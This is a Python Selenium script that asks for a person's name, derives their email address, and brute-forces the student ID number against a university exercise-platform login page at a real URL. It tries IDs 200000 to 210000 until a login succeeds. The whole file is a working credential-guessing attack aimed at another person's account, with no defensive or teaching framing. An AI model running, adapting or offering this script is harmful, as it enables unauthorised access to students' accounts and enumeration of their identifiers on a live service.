from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import re
import subprocess as sp

print('Name: ')
name = input()
print('Surname: ')
surname = input()

# access statistica page
options = webdriver.ChromeOptions()
options.binary_location = r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
options.add_argument("--headless")
options.add_argument('window-size=1200x600')
driver = webdriver.Chrome("chromedriver.exe", options = options)
url = 'http://datascience.maths.unitn.it/ocpu/library/doexercises/www/'
driver.get(url)

# wait for the page to be loaded
wait = WebDriverWait(driver, 20)

try:
  wait.until(EC.visibility_of_element_located((By.ID, 'email_address')))
except:
  print('Webpage not available')

# get email and matricola values from the page
print('Login: ' + name + ' ' + surname)
email = name.lower()+'.'+surname.lower()
email = email.replace(' ', '')
print('Mail:'+email)

driver.find_element_by_id('email_address').send_keys(email)

for matricola in range(200000,210000):
  driver.find_element_by_id('matricola').clear()

  # write values in the page
  driver.find_element_by_id('matricola').send_keys(matricola)
  driver.find_element_by_id('signin').click()

  sp.call('cls',shell=True)
  print(email)
  print("Trying with id: " + str(matricola))

  try:
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="container"]/div[2]/div[1]/button')))
  except:
    print('Found, matricola: '+str(matricola))
    break
  try:
    driver.find_element_by_xpath('//*[@id="container"]/div[2]/div[1]/button').click()
    wait.until_not(EC.visibility_of_element_located((By.XPATH, '//*[@id="container"]/div[2]/div[1]/button')))
  except:
    print('box of wrong credentials not found')

driver.close()